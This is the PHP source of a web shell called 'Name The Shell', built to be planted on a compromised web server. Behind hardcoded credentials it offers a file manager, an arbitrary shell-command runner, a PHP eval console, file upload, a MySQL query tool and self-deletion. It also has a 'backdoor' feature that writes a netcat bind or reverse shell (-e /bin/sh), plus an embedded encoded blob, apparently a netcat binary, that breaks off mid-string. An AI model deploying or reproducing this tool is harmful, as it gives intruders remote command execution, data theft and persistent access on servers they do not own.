<?php
  
  
  /* Configurations */
  $username = "scarlats";
  $password = "scarlats";
  $auth_msg = "Name The Shell Login"; // Message that shows on authentication dialog
  $owned = "Owned By Supercow Warrior"; // Own String
  
  /* When it's true, the script will show not found if don't receive 
   * the parameter in $protected_param
   */
  $protected_notfound = false; 
  $protected_param = ""; /* If $protected_notfound is true then don't forget this */
  $protected_file = ""; /* If isn't empty then return the content of the file specified */
  $protected_type = ""; /* The Content-Type of $protected_file */
  
  
  /* Protect */
  if($_COOKIE['PROCT'] != $protected_param) { 
  if ($protected_notfound && !isset($_GET[$protected_param])) {
    header('HTTP/1.1 404 Not Found');
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
</body></html>";
    exit;
  }
  if (!empty($protected_param) && !isset($_GET[$protected_param])) {
    if(!empty($protected_file)) {
        header('Content-Type: '.$protected_type);
        if(file_exists($protected_file)) readfile($protected_file);
    }
    exit;
  }
  setcookie('PROCT', $protected_param);
  }
  
  $features = array(
    "filesystem" => "File Sytem",
    "encoder"    => "Encoder",
    "shellexec" => "Shell Exec",
    "phpexec" => "PHP Exec",
    "mysql" => "MySQL",
    "upload" => "Upload",
    "backdoor" => "BackDoor",
    "selfdestruct" => "Self Destruction",
    "\" onclick=\"if (confirm('Are you sure?')) window.close();\" \"" => "Quit"
   );
  
  /* Auth */
  
  if (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
    if ($_SERVER['PHP_AUTH_USER'] == $username && $_SERVER['PHP_AUTH_PW'] == $password) {
       $auth = true; // Just set it, for don't join so much code here
    }
    else {
       header("WWW-Authenticate: Basic realm=\"".$auth_msg."\"");
       
  
    }
  }
  else {
    header("WWW-Authenticate: Basic realm=\"".$auth_msg."\"");
    
  
  }
  
  if(!function_exists('mime_content_type')) {
    function mime_content_type($filename) {
        $ext = substr(strstr($filename, '.'), 1);
        $text = array('php', 'txt', 'css', 'htm', 'html', 'js', 'asp', 'aspx', 'jsp', 'cgi', 'sql');
        $image = array('jpg', 'jpeg', 'gif', 'png', 'jiff', 'svg', 'ico');
        $video = array('mpeg', 'avi', 'mp4', 'swf', 'wmv', 'rmvb', 'flv', '3gp');
        if(in_array($ext, $text)) {
           $mime = 'text/'.$ext;
        }
        elseif(in_array($ext, $image)) {
           $mime = 'image/'.$ext;
        }
        elseif(in_array($ext, $video)) {
           $mime = 'video/'.$ext;
        }
        else {
           $mime = 'application/'.$ext;
        }
        return $mime;
    }
  }
  if(!function_exists('posix_getpwuid')) {
     function getfuid($filen) {
       $out = shell_exec('ls -l "'.$filen.'"');
       $ar = split(' ', $out);
       return $ar[2];
     }
     function getfgid($filen) {
       $out = shell_exec('ls -l "'.$filen.'"');
       $ar = split(' ', $out);
       return $ar[3];
     }
  }     
  
  if(isset($_COOKIE['CWD']) && !isset($_GET['chdir'])) {
     chdir(base64_decode($_COOKIE['CWD']));
  }
  if(isset($_GET['chdir'])) {
     chdir((isset($_COOKIE['CWD']) && substr($_GET['chdir'], 0,1) != "/" ? base64_decode($_COOKIE['CWD'])."/" : "").$_GET['chdir']);
   
  }
  function str_perms($perms) {
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
    else {
        // Unknown
        $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
             (($perms & 0x0800) ? 's' : 'x' ) :
             (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
             (($perms & 0x0400) ? 's' : 'x' ) :
             (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
             (($perms & 0x0200) ? 't' : 'x' ) :
             (($perms & 0x0200) ? 'T' : '-'));
             
    /* Code copied from: http://www.php.net/manual/en/function.fileperms.php */
    return $info;
  }
  
  function readable_size($size) {
     $kb = 1024;
     $mb = 1024*$kb;
     $gb = 1024*$mb;
     $tb = 1024*$gb;
     
     if ($size < $kb) {
         return sprintf("%d B", $size);
     }
     elseif ($size >= $kb and $size < $mb) {
         return sprintf("%.2f KB", $size/$kb);
     }
     elseif ($size >= $mb and $size < $gb) {
         return sprintf("%.2f MB", $size/$mb); 
     }
     elseif ($size >= $gb and $size < $tb) {
         return sprintf("%.2f GB", $size/$gb); 
     }
     else {
         return sprintf("%.2f TB", $size/$tb); 
     }
     
  }
  
  if (!isset($_GET['content'])) {
     echo "<html>
     <head>
     <title>".$_SERVER['HTTP_HOST']." - Name The Shell</title>
     <style type=\"text/css\">
     
     body {
     font-size: 10pt;
     font-family: Ubuntu;
     color: #ccc;
     background-color: #111;
     line-height: 14pt;
     margin-top: 20pt;
     }
     
     #header {
     padding: 5pt;
     }
     
     #file_tbl {
     width: 100%;
     font-size: 10pt;
     }
     #file_tbl th {
     font-weight: bold;
     text-align: left;
     }
     .frm {
     border: 1pt solid #ccc;
     border-radius: 5pt;
     background-color: #52f;
     padding: 5pt;
     margin-bottom: 5pt;
     font-size: 10pt;
     }
     .button {
     color: #aaa;
     text-decoration: none;
     margin: 8pt;
     border-radius: 3pt;
     font-weight: bold;
     padding: 3pt;
     border: 1pt solid #52f;
     }
     .button:hover {
     color: #fff;
     border: 1pt solid #ddd;
     }
     #selected {
     border: 1pt solid #ddd;
     background-color: #30a;
     }
     .file {
     color: #ccc;
     text-decoration: none;
     }
     .file:hover {
     color: #fff;
     }
     
     a {
     color: #4cf;
     text-decoration: none;
     }
     a:hover {
     color : #fff;
     }
     #code {
     background-color: #fff;
     border-radius: 5pt;
     padding: 15pt;
     }
     #resultquery, #resultquery th, #resultquery td {
     border: 1pt solid;
     
     }
     .fstoolbar:hover {
     opacity: 0.8;
     }
     </style>
     <script language=\"javascript\">
     function mkdir() {
     var dirname = prompt('Directory name:');
     document.location.href = '?mkdir='+dirname;
     }
     function touch() {
     var filename = prompt('File name:');
     document.location.href = '?feature=info&act=touch&filename='+filename;
     }
     </script>
     </head>
     <body>", PHP_EOL; 
     
     $uname = shell_exec("uname -a");
     $software = $_SERVER['SERVER_SOFTWARE'];
     $uid = shell_exec("id");
     $pwd = getcwd();
     
     echo "<h1 align=\"center\">Name The Shell</h1>", PHP_EOL;
     echo "<div id=\"header\" class=\"frm\">"."<br/>\n";
     echo "Software: ".$software." "."<a href=\"?content=phpinfo\" target=\"_blank\">PHP ".phpversion()."</a><br/>\n";
     echo "uname -a: ".$uname."<br/>\n";
     echo $uid."<br/>\n";
     echo ini_get('safe_mode') ? "<span style=\"color: red; font-weight: bold;\">Safe mode ON</span><br>\n" : "<span style=\"color: #0cf; font-weight: bold\">Safe mode OFF</span><br>\n";
     echo $pwd." <b>".str_perms(fileperms($pwd))."</b><br/>\n";
     echo "</div>\n";
     setcookie('CWD', base64_encode($pwd));
     
     if (isset($_GET['mkdir'])) {
        if (mkdir($_GET['mkdir'])) {
           echo 
           "<script language=\"javascript\"> alert('Directory ".$_GET['mkdir']." created!'); </script>\n";
        }
        else {
              echo 
           "<script language=\"javascript\"> alert('Fail to create ".$_GET['mkdir']."'); </script>\n";
        }
     }
     
     $cwd = opendir($pwd);
     $files = array();
     $dirs = array();
     for($i = 0; ($f = readdir($cwd)); $i++) {
        if (filetype($f) == 'dir') 
            $dirs[$i] = $f;
        else
            $files[$i] = $f;
     }
     sort($dirs);
     sort($files);
     $files = array_merge($dirs, $files);
     
     echo "<div class=\"frm\" align=\"center\">".$owned."</div>\n";
     
     /* Menu of features */
     echo "<div class=\"frm\" style=\"padding: 10pt;\">\n";
     foreach($features as $i => $title) {
        echo "<a href=\"?feature=".$i."\" class=\"button\" ";
        if (isset($_GET['feature']) && $_GET['feature'] == $i) echo "id=\"selected\"";
        if (!isset($_GET['feature']) and $i == "filesystem") echo  "id=\"selected\"";
        echo " >".$title."</a>\n";
     }
     echo "</div>\n";
     
     
     if (!isset($_GET['feature']) or $_GET['feature'] == 'filesystem') {
     /* List the files of current directory */
     echo "<div class=\"frm\">\n";
     echo "<table border=0 id=\"file_tbl\" >\n";
     echo "<tr><th>Filename</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Perms</th><th>Action</th></tr>\n";
     foreach($files as $f) {
          $perms = str_perms(fileperms($f));
          $info = stat($f);
          if (function_exists('posix_getpwuid')) {
          $u= posix_getpwuid($info['uid']);
          $user_owner = $u['name'];
          }
          else $user_owner = getfuid($f);
          if (function_exists('posix_getgrgid')) {
          $g = posix_getgrgid($info['gid']);
          $group_owner = $g['name'];
          }
          else $groud_owner = getfgid($f);
          $size = $info['size'];
          $modify = $info['mtime'];
          
          echo "<tr>\n";
          echo "<td>";
          echo ((fileperms($f) & 0x4000) ? "<img src=\"?content=img&id=dir\" width=20 height=20 style=\"vertical-align: middle\"/>":"");
          
          if (!(fileperms($f) & 0x4000)) {
             $mime = mime_content_type($f);
             $type_a = $mime ? split("/", $mime): "binary";
             $type = $type_a[0];
             $type = $type == 'application' || $type == 'inode' ? 'binary' : $type;
             echo "<img src=\"?content=img&id=".$type."\" width=20 height=20 style=\"vertical-align: middle\"/>";
          }
          
          echo ((fileperms($f) & 0x4000) ? "<a href=\"?chdir=$f\" class=file>".$f."</a>" : "<a class=file href=\"?feature=info&filename=".$f."\">".$f."</a>");
          echo "</td>\n";
          echo "<td>". ((fileperms($f) & 0x4000) ? "DIR":readable_size(intval($size))) ."</td>\n";
          echo "<td>".date('d-m-Y H:i:s', intval($modify))."</td>\n";
          echo "<td>".$user_owner."/".$group_owner."</td>\n";
          echo "<td>".$perms."</td>\n";
          echo "<td>";
          echo ((fileperms($f) & 0x4000) ? "":"<a href=\"?feature=info&act=edit&filename=".$f."\"><img src=\"?content=img&id=edit\"".
               " width=20 height=20 style=\"vertical-align: middle\"/></a>");
          echo ((fileperms($f) & 0x4000) ? "":"<a href=\"?content=download&filename=".$f."\">".
               "<img src=\"?content=img&id=down\" widht=20 height=20 style=\"vertical-align: middle;\"/></a>");
          echo "</td>\n";
          echo "</tr>\n";
     }
          echo "</table>\n";
          echo "<hr noshade>\n";
          echo "<a class=\"fstoolbar\" href=\"?chdir=".$_SERVER['DOCUMENT_ROOT']."\"><img src=\"?content=img&id=home\"></a>\n";
          echo "<input type=\"image\" class=\"fstoolbar\" src=\"?content=img&id=dirnew\" onclick=\"mkdir();\"/>\n";
          echo "<a class=\"fstoolbar\" href=\"?chdir=".urlencode('/')."\"><img src=\"?content=img&id=fileroot\"></a>\n";
          echo "<input type=\"image\" class=\"fstoolbar\" src=\"?content=img&id=filenew\" onclick=\"touch();\"/>\n";
          echo "<a class=\"fstoolbar\" href=\"?\"><img src=\"?content=img&id=refresh\"/></a>\n";
          echo "</div>";
     }
     
     if (isset($_GET['feature']) && $_GET['feature'] == 'encoder') {
        echo "<div class=\"frm\">";
        echo "<form action=\"?feature=encoder\" method=\"post\">\n";
        echo "<textarea name=\"input\" style=\"width: 100%; height: 80pt;\">".$_POST['input']."</textarea><br>\n";
        echo "<input type=\"submit\" value=\"Calculate\"/>\n";
        echo "</form>\n";
        
        echo "<table border=0>\n";
        echo "<tr><td colspan=2>\n"; 
        
        echo "<b>Hashes:</b></td></tr>";
        echo "<tr><td align=right>\n";
        echo "md5: </td><td><input type=\"text\" value=\"".md5($_POST['input'])."\"/>\n</td></tr>";
        echo "<tr><td align=right>\n";
        echo "sha1: </td><td><input type=\"text\" value=\"".sha1($_POST['input'])."\"/>\n</td></tr>";
        echo "<tr><td align=right>\n";
        echo "crc32: </td><td><input type=\"text\" value=\"".crc32($_POST['input'])."\"/>\n</td></tr>";
        
        echo "<tr><td colspan=2>\n";
        echo "<b>Url:</b></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "urlencode: </td><td><input type=\"text\" value=\"".urlencode($_POST['input'])."\"/></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "urldecode: </td><td><input type=\"text\" value=\"".urldecode($_POST['input'])."\"/></td></tr>\n";
        
        echo "<tr><td colspan=2>\n";
        echo "<b>Base64:</b></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "base64_encode: </td><td><input type=\"text\" value=\"".base64_encode($_POST['input'])."\"/></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "base64_decode: </td><td><input type=\"text\" value=\"".base64_decode($_POST['input'])."\"/></td></tr>\n";
        
        echo "</table>\n";
        echo "</div>";
     }
     
     if (isset($_GET['feature']) && $_GET['feature'] == 'info') {
        echo "<div class=\"frm\">\n";
        
        echo "<b>Viewing file: </b>".$_GET['filename']."&nbsp;(".readable_size(filesize($_GET['filename'])).")&nbsp;&nbsp<b>".str_perms(fileperms($_GET['filename']))."</b><br/>\n";
        
        $toolbar = array(
                "Info" => "?feature=info",
                "Code" => "?feature=info&act=code",
                "Edit" => "?feature=info&act=edit",
                "Image" => "?feature=info&act=img"
                );
                
        foreach($toolbar as $title => $url) {
           echo "<a href=\"".$url."&filename=".$_GET['filename']."\" style=\"font-weight:bold; margin-left: 5pt;\">".$title."</a>\n";
        }
        
        echo "<hr noshade/>";
        
        if (!isset($_GET['act'])) {
            $f = $_GET['filename'];
            $perms = str_perms(fileperms($f));
            $info = stat($f);
            if(function_exists('posix_getpwuid')) {
            $u = posix_getpwuid($info['uid']);
            $user_owner = $u['name'];
            }
            else $user_owner = getfuid($f);
            if(function_exists('posix_getgrgid')) {
            $g = posix_getgrgid($info['gid']);
            $group_owner = $g['name'];
            }
            else $group_owner = getfgid($f);
            $size = $info['size'];
            $modify = $info['mtime'];
            $atime = $info['atime'];
            $ctime = $info['ctime'];
        
            echo "<table border=0 id=\"file_tbl\">\n";
            echo "<tr><td><b>Path: </b></td><td>".$pwd."/".$f."</td></tr>\n";
            echo ((fileperms($f) & 0x4000) ? "":"<tr><td><b>Size: </b></td><td>".readable_size(intval($size))."</td></tr>\n");
            echo ((fileperms($f) & 0x4000) ? "":"<tr><td><b>MD5: </b></td><td>".md5(file_get_contents($f))."</td></tr>\n");
            echo "<tr><td><b>Owner/Group:</b></td><td>".$user_owner."/".$group_owner."</td></tr>\n";
            echo "<tr><td><b>Perms:</b></td><td>".$perms."</td></tr>\n";
            echo "<tr><td><b>Access Time:</b></td><td>".date('d-m-Y H:i:s', intval($atime))."</td></tr>\n";
            echo "<tr><td><b>Create Time:</b></td><td>".date('d-m-Y H:i:s', intval($ctime))."</td></tr>\n";
            echo "<tr><td><b>Modify Time:</b></td><td>".date('d-m-Y H:i:s', intval($modify))."</td></tr>\n";
            echo "</table>";            
        }
        
        if (isset($_GET['act']) && $_GET['act'] == 'code') {
            echo "<div id=\"code\">\n";
            highlight_file($_GET['filename']);
            echo "</div>\n";
        
        }
        if (isset($_GET['act']) && $_GET['act'] == 'edit') {
            if (isset($_POST['filecontent'])) {
               $fp = fopen($_GET['filename'], 'w');
               fwrite($fp, $_POST['filecontent']);
               fclose($fp);
            }
        
            echo "<form action=\"?feature=info&act=edit&filename=".$_GET['filename']."\" method=\"post\">\n";
            echo "<textarea name=\"filecontent\" style=\"width: 100%; height: 100%;\">".file_get_contents($_GET['filename'])."</textarea><br>\n";
            echo "<input type=\"submit\" value=\"Save\"/>\n";
            echo "<input type=\"reset\" value=\"Reset\"/>\n";
            echo "</form>\n";
            
        }
        if (isset($_GET['act']) && $_GET['act'] == 'img') {
            echo "<img src=\"?content=download&filename=".$pwd."/".$_GET['filename']."\">";
        }
        if (isset($_GET['act']) && $_GET['act'] == 'touch') {
            $code = touch($_GET['filename']) ? "document.location.href='".$toolbar['Edit']."&filename=".$_GET['filename']."';" : "alert('Fail to create file.');\n history.back();";
            echo "<script language=\"javascript\"> ".$code." </script>";
         }   
        echo "</div>\n";
     }
     if (isset($_GET['feature']) && $_GET['feature'] == 'shellexec') {
        echo "<div class=\"frm\">";
        echo "<b>Code:</b><br>\n";
        echo "<form action=\"?feature=shellexec\" method=post>\n";
        echo "<textarea name=cmd style=\"width: 100%; height: 50pt;\">";
        echo isset($_POST['cmd']) ? $_POST['cmd'] : "";
        echo "</textarea><br>\n";
        echo "<input type=\"submit\" value=\"Run\">\n";
        echo "</form>";
        echo "<b>Output:</b><br>\n";
        echo "<textarea style=\"width: 100%; height: 150pt;\">";
        $return = 0;
        if (isset($_POST['cmd']))  system($_POST['cmd'], $return);
        echo "</textarea>\n";
        echo "<b>Status: ".$return."</b>\n";
        echo "</div>\n";
     }
     if (isset($_GET['feature']) && $_GET['feature'] == 'phpexec') {
        echo "<div class=\"frm\">\n";
        echo "<b>Code:</b><br>\n";
        echo "<form action=\"?feature=phpexec\" method=post>\n";
        echo "<textarea name=cmd style=\"width: 100%; height: 50pt;\">";
        echo isset($_POST['cmd']) ? $_POST['cmd'] : "";
        echo "</textarea><br>\n";
        echo "<input type=\"submit\" value=\"Run\">\n";
        echo "</form>";
        ini_set('display_errors', 'On');
        echo "<b>Output:</b><br>\n";
        echo "<textarea style=\"width: 100%; height: 150pt;\">";
        if (isset($_POST['cmd']))  echo eval($_POST['cmd']);
        echo "</textarea>\n";
        echo "</div>\n";
     }
     if (isset($_GET['feature']) && $_GET['feature'] == 'upload') {
        echo "<div class=\"frm\">\n";
        echo "<form action=\"?feature=upload\" enctype=\"multipart/form-data\" method=\"post\">\n";
        echo "<b>Save in: <input type=\"text\" name=\"uploadir\" value=\"".$pwd."\"/>\n";
        echo "<input type=\"file\" name=\"thefile\"/>\n";
        echo "<input type=\"submit\" value=\"Upload\"/>\n";
        echo "</form>\n";
        
        if (isset($_FILES['thefile'])) {
            $path = $_POST['uploadir'];
            $path = $path.(substr($path, -1) == '/' ? "": "/").$_FILES['thefile']['name'];
            $msg = move_uploaded_file($_FILES['thefile']['tmp_name'], $path) ? "File Uploaded!" : "Fail to upload the file.";
            echo "<script language=\"javascript\"> alert('".$msg."'); </script>\n";
        }
       
     } 
     if (isset($_GET['feature']) && $_GET['feature'] == 'selfdestruct') {
            echo "<div class=\"frm\">\n";
            echo "<form action=\"?feature=selfdestruct\">";
            echo "<b>ARE YOU SURE?</b><br>";
            echo "Type 369 to confirm: <input type=\"text\" name=\"c\"/><input type=\"submit\" value=\"Ok\"/>";
            echo "</form>";
            echo "</div>";
            
            if($_GET['c'] == '369') {
                unlink($_SERVER['SCRIPT_FILENAME']);
            }
       }
      if (isset($_GET['feature']) && $_GET['feature'] == 'mysql') {
         if(isset($_COOKIE['DBM']) && base64_decode($_COOKIE['DBM']) != "::::" && $_COOKIE['DBM']) {
            list($musername, $mpassword, $hostname, $port, $db) = split(':', base64_decode($_COOKIE['DBM']));
            $conn = true;
         }
         else $conn = false;
         
         $form = array(
           "musername" => "Username",
           "mpassword" => "Password",
           "hostname" => "Hostname",
           "port"     => "Port",
           "db"       => "Database"
         );
         
         echo "<div class=\"frm\">\n";
         echo "<form action=\"?feature=mysql\">";
         echo "<table border=0>\n";
         foreach($form as $field => $label) {
            echo "<tr><td align=right><b>".$label."</td><td><input type=\"text\" name=\"".$field."\" value=\"".$$field."\"/>\n";
         }
         echo "<input type=\"hidden\" name=\"feature\" value=\"mysql\">";
         echo "<tr><td align=right><input type=\"submit\" value=\"Connect\"/>";
         echo "</table></form>";
         
         if(isset($_GET['musername']) && isset($_GET['mpassword']) && isset($_GET['hostname']) && isset($_GET['port']) && isset($_GET['db']) )
         setcookie('DBM', base64_encode($_GET['musername'].':'.$_GET['mpassword'].':'.$_GET['hostname'].':'.$_GET['port'].':'.$_GET['db']));
         
         if ($conn) {
           $connection = mysql_connect($hostname.':'.$port, $musername, $mpassword);
           if ($connection) {
              mysql_select_db($db, $connection);
              
              echo "<form action=\"?feature=mysql\" method=post>\n";
              echo "<b>SQL Query:</b><br>";
              echo "<textarea name=\"query\" style=\"width: 100%\">".$_POST['query']."</textarea><br>";
              echo "<input type=\"submit\" value=\"Submit Query\"/>\n";
              echo "</form>";
              
              if(isset($_POST['query'])) {
                $r = mysql_query($_POST['query'], $connection);
                $result = mysql_fetch_assoc($r);
                
                echo "<table border=1 cellspacing=0 id=\"resultquery\" cellpadding=5>";
                echo "<tr>";
                foreach($result as $column => $value) {
                    echo "<th>".$column."</th>";
                }
                echo "</tr>";
                
                echo "<tr>";
                foreach($result as $key => $value) {
                    echo "<td>".$value."</td>";
                }
                
                while($result = mysql_fetch_assoc($r)) {
                  echo "<tr>";
                  foreach($result as $key => $value) {
                    echo "<td>".$value."</td>";
                  }
                  echo "</tr>";
                }
                
                echo "</table>";
                }
                mysql_close($connection);
           }
           else
             echo "<b>Fail on connection.</b>";
         }
      }
     if (isset($_GET['feature']) && $_GET['feature'] == 'backdoor') {
          echo "<div class=\"frm\">";

          if (file_exists('nametheshell-backdoor.php'))
              echo "<a href=\"nametheshell-backdoor.php\" target=\"_blank\">Start BackDoor</a>";

          echo "<form action=\"?feature=backdoor\">";
          echo "Reverse: <input type=\"checkbox\" name=\"reverse\" value=1><br/>";
          echo "Port: <input type=\"text\" name=\"port\"><br/>";
          echo "Reverse Address: <input type=\"text\" name=\"address\"><br/>";
          echo "<input type=\"hidden\" name=\"called\">";
          echo "<input type=\"submit\" value=\"Create\">";
          echo "</form></div>";

          if (isset($_GET['called'])) {
              if ($_GET['reverse'] == '1')
                  $cmd = '"./nc \\"'.$_GET['address'].'\\" '.$_GET['port'].' -e /bin/sh"';
              else
                  $cmd = '"./nc -l \\"'.$_SERVER['SERVER_NAME'].'\\" '.$_GET['port'].' -e /bin/sh"';

              file_put_contents('nametheshell-backdoor.php', '<?php system('.$cmd.'); ?>');

              $netcat = gzdecode(base64_decode(
"H4sICIdBKFQAA25ldGNhdC5pAN29aXPbxrIw/Dn6FYhTSSSFSkRqsWwmueXYiqMnieQjyTnnlI4L".
"BZEghZgEYADU4nv9/va3u2dfsJCSndzrSmxilp6enp6enp6eni+CfvAojatRVH07erT2BX5+P8rm".
"8ygdb82SNP6RJ+plBk+cOtM4jYtk9O3Vo6APKTvbWolggClune8WZfFdko5mi3H8XVmNZ8kl1Q92".
"gl1sZa+2CCtgg5jEUbUo4lIHsjPYaSjlh5PsHOxj3xe3W9N08d1lUpXf5UU8jicW6N0G0ANRam//".
"vgiUd+V3I6f1vSdL1Ore0ZusGJfJ+9hoa397ibZUzx93oc/BwX3pQxhUi0uNPvBn9e7afNfU3IA3".
"1x3JrZ2B3pjd+/bGkGb22PsoO7AZT80fgfWaSSjI/W46Gn2X7Bo47H77WIcB42xM0/7OKtWxcnWX".
"46wKFmmZTNN4HCRpFeBohNWQJtjefSEjwJvRVVRwiPaMrSFJV+aJkmoyi6bGxNy1BY7dRnfYZQWj".
"agDfb+FNT1V/k3E6TqLUmOT2bFVFumPtAWszuCoiyLFfj1z3li/vqri8iXKDWoP2tu1J0k5QzimL".
"NMnSALPWguC/4f+AcVvISg4ppayKxaiin1hozWT1MLwJq7iYQ9LTx0NP5iiDZWcxz5/2fbkFLKfZ".
"OH56YGU+7e8PBSOzlj9gecCUWkvSqIrHXfErqyy/jmZOIzITkW/AwEIAa+Ss9Q84I3fbZiQMkc1B".
"ph6ghAiMhxwKNTrBZhgu8qoYyiGChIQnIF7/fHZ0Hp6dPzt/fQZfUVUVyeWiisMwWF8Pw6qI0jKP".
"ijitQgIahhsbiPmTevHKJIlATNJYMcm7RVYpfIp4znAZJ9cop+rrzrJ0agGQSRLKTIHBP2EY31Yx".
"DA6iHjQBroPuaUK1AbNz19YOTEpg80XK5TpQeIQ4hNO4CueX4WhRhPPoNli/zpLxhof+aVZdFdkN".
"Uj1gfeLwxtnichYHUZVNAig3ytKyClDU4/imML4bjPeaQbq5OayjNVlplqaL2Qy/+hsMH44MUgcw".
"Sf56TORgATqzvxAdl/V0BA0s/2o0TYaCmVFlYxcl0K4A2gg5GLHrcckW8AJmCVhoVu9BM5qTWRZV".
"DEsP49dh2YDkQ+Cnj61Ox9kShPzEdJQsyBDthmc9jj2+KF5GZfxw+HJc5dpqIr3oiPVfgLg9+9e8".
"s5968e5B5trH6Ya3D+ZoWEOyTG/+mnHpPDA+wVzfl7//0HTvz6fuC2yT+vUGMU2JYojN9nejYF32".
"DkB20ZwcBWF/10OQ8lMtu53MXqgqGhvgQYu9xKjU0TRDe7ylWzJr3c/ANmix5ZltDawNhmR6GkPY".
"7YT4Y+jml1dZUXGWWYT05Skl8uFfT67GdYsQP4b6dsXAA0odhD4YAk+7gAdN+Lu/7wVidMYpZvQF".
"/t4ZeIGo6qxAw4bJJ1cI9P4u1vTXqpFHrElWsXGbZld7t4jGq7QmKwKP7iw1HbozNlUBxjZmUX/H".
"tsF0Ym1//1RH4Oc4vu5ACUHtLlRjZaedyhoskNVXMFCGkp2YhcGdZ+O4c+EUKPq2vrSGbjaZNKEr".
"kYVyTcgyYHkTsZiNIfhvXvY6ml0M3gzJ5jIpmypq2I5m2aihX77xKGbJvOOAYNElRqQjzlUy7z5w".
"izKGBXhcdoJc6qUbB2YcjcdFN5g3l7MGCrNCb+M7JquaCtFYMRrVFUQrT7DJaVQ0ldQwBPzEoUCL".
"pJTlR2nViclZUSGIu/PYpGxvROMzUXyVhibJbJmGWHHeUNNolRpNFSw+6+HXjAsKh2qgJL4T3CUy".
"hfY4EhnNbcPfoEt3ogVHFjhrFqf8FGcZxVGe6+j0InRtNUnqRIGjG3F1KLCUIqECBUITcmglll3P".
"YKk1WWUysRgI6WiizQYkEONi5NEaFPCVyHOi0qYlK0i0rAZ8cTUboZUxmPpwY2tVIJYsM5OvTYFc".
"o6zhILALBdZkR8jjPf4ieNLhzLumX7RSBbm3FcrydYvPkUCfK3o+l7LB2J4PciYE2owwqpJEDbhc".
"RT3JPjZs65qrlKFMNc6x7R2MKGBuH+QiG8jFlnZNj+2jmbrqbL0LxLJHlZ/Yap9e2WqZyK8tHtCz".
"7aa2zZYL3nQhCGlXbZcOeIZhn352J/9Kp+b93WU2so4Qc5eKhSmBPNukRdOGb0GCDfB60nLCXDvF".
"EArb0HlMACQYQrQ2/OMIrQQbQ7sebt8aK/5SUxE3bo0Vz2oq8nWuvuILUdFDd7kaLN1fF8TyXXdh".
"LE8FF8YSBNFJWcTTpKxoHjZVRrsHr/5FMBh08Chabg+KNcp4Fo8qw/1gqVrdN7uello2umZLnf2G".
"WGvJtIyN1hzfs+Zq9kSFpS2ZwmBl82RkL3vW0bBPK8Wt3Hp/G5D4Llg/AIUe10c8jnIKw3i/EQft".
"DB2uw3UQMy619KWZAwsU1Bqzor0s9h3e0xcXvmnFpDKPR5IMapm7DmETZh2+Q2LKU5lbwyrd62hm".
"sbrzuItLUE0PYRybO2hsOTFnYfSyw6LpDqI2hhpsc2urj7W+GxqH86h8SyruUm3r/K/xN/vDOsph".
"068yRKpd6By+jsws+VwWJ/ZeIwaHFGBEYdDTlHoOWEO+ix5rIk9K0dK1NO8ElkHdQJUc+tjjGFvH".
"IEUcjTGXHQN4i9wUSRW3lIlvR3FeqUIm11mFMTVbVLQ09AdLi2ytm/mK/ezU0W49DdiBiiVI/D02".
"q2hSzSwNycRsXLkedCGRozx2W0Hvynk0KjLT17jDYm1UxGrN53M4PFCVtpvz6M+ssNcObdZDmS6H".
"UsNlmoSt8ido0gSr+vsWRMO11jw3+CIdjNNhxySMaHdDDLlk+Z2QJbqk5S2wbHBWITJQBcokZso/".
"aSsLdLOZVUaYuQLd4gWdeLysKaOjPz+QCgSAc+q308Uf1K7s9WWWw85Lsz6b3oq48vLDMKTuxc4+".
"KUsaI0YzgDZc+yCh4KCboLigCUNRBGoCF0azsJyBYk6NtJQhlytgXmxIlaEsWztUiDsw58CKt2Fp".
"eDqi2Wr0drjmYeZRtkg1L8gwzG7SuBjyBZnbnZN07K2cgrpQlEJJ0S2Iwg9UYCFAlXmS8gqB20lE".
"FH6w/A9CYx1HVTS0xmiw2zpGjBDVsG24O0JSQ14/DF2JPkGAfrLViMIqq5BN4ndL1boBGbfIl6+W".
"vY1TVYsdF4SMDH4+QBdfyQlW5mWRReNRBOPLIdaN6e4BjYSJpI2bMziorj7IKCMgbZC9O3RRVp7E".
"GPs5kZulI9dOuSqvpAUpSXXU5Xl8qL1FSH8qmkqoNsJ3i3gR18z2goNSpdbMcpzgdBtj6M0q4R8H".
"PM/Lo3G/NmegyyiGRhMv7Qxax7u4kYbWZtY56AhKlxAS5HU2i6pkFhsMglJQs/K2tD/YbkXgMiqK".
"hB/ldZkHzWBER3Dh72BPcbUXtMPUe1Lpl3xsd6giSsfZvJMjuuZNRRKqFHXtU6s47gJKQWPHaEnK".
"rpvEXoA95aqFZS4XE1IZpXs9pc7iVpewRj+tAbd7mojB1oTjZaNwbydi6QfDtQpGUZpgurgiM+fm".
"RL/OwZIKN4lw025ZRCitgWGspHE8tVLKOLdAxZAqboyYTv8cT9hLuIhbmzgxUgZka0taLmbV/WjZ".
"C/jY6Xt/haWXofyo47De28PRRUZydy06Ht/MZlZnqR3o/wD96QW7Ln1j1aM25NmfT4OsYgZdyAi2".
